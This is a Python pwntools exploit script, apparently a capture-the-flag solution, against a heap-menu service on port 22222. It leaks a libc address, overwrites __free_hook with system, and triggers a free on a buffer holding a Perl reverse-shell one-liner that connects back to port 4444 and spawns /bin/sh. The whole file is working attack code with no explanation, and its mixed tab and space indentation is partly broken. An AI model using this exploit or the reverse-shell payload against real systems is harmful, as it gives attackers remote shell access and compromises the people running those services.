from pwn import *
import time
def hexdump(src, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    return ''.join(lines)
def data(menu, len, index):
	return p32(menu)+p32(len)+p32(0xf)+p32(index)
def libc_leak(p):
	s = remote("0",22222)
	s.recv(1024)
	p.status("Stage 1")
	dat = data(0x18,0x00, 0x00)
	s.send(dat)

	dat = data(0x02,0x0100,0x00)
	s.send(dat)

	dat = data(0x18,0x00,0x01)
    s.send(dat)

    dat = data(0x02,0x100,0x01)
    s.send(dat)

    dat = data(0x05,0x00,0x00)
	s.send(dat)
	s.send("\x00\x00\x00\x00")

	dat = data(0x18,0x00,0x00)
    s.send(dat)

    dat = data(0x02,0xffffffff,0x00)
	s.send(dat)

	dat = data(0x04,0xffffffff,0x00)
	s.send(dat)
	s.send("\x00\x00\x00\x00")
	libc_Base = u64(s.recvuntil("\n\n")[4:-2]+"\x00\x00")-0x3be7b8
	log.info("libc_Base : " + hex(libc_Base))
	s.close()
	return libc_Base
def pwn(free_hook,system,p):
	s = remote("0",22222)
	s.recv(1024)
	p.status("Stage 2")

	dat = data(0x18,0x00,0x00)
	s.send(dat)

	dat = data(0x02,0xff,0x00)
	s.send(dat)

	dat = data(0x02,0xffffffff,0x00)
	s.send(dat)
	
	dat = data(0x01,0xffffffff,0x00)
	s.send(dat)
	dat = "perl -e \'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'"
	dat += "\x00"
	dat += "A"*(256+8-len(dat))+"\xff"*8+"\x00"*(0x1000-256-8-8)
	s.send(dat)

	dat = data(0x18,0x00,0x02)
	s.send(dat)

	dat = data(0x03,0x08,0x02)
	s.send(dat)
	s.send(p32(-704&0xffffffff))
	s.send("\x02\x00\x00\x00")
	s.send("\x00\n")
	time.sleep(4)

	dat = data(0x18,0x00,0x03)                                                                                                                            
	s.send(dat)

	dat = data(0x03,0xff,0x03)                                                                                                                           
	s.send(dat)
	s.send("\x50\x00\x00\x00")
	s.send("\x03\x00\x00\x00")
	s.send("\x00"*(8+8+8)+p64(8)+p64(free_hook)+"\x01")
	raw_input('')
	
	dat = data(0x18, 0x00, 0x05)
    s.send(dat)

    dat = data(0x02,0x08,0x05)
    s.send(dat)

    dat = data(0x01,0xff,0x03)                                                                                                                            
	s.send(dat)
	s.send(p64(system))
	time.sleep(1)
	raw_input('eof')

	dat = data(0x05,0x00,0x00)
	s.send(dat)
	s.send("\x00\x00\x00\x00")
	p.success("Get Shell")
p = log.progress("eagle")
libc_Base = libc_leak(p)
#heap_Base, top_Chunk= heap_leak(p)
system = libc_Base + 0x46590
free_hook = libc_Base + 0x3c0a10
log.info("free_hook : " + hex(free_hook))
log.info("system : " + hex(system))
pwn(free_hook, system,p)
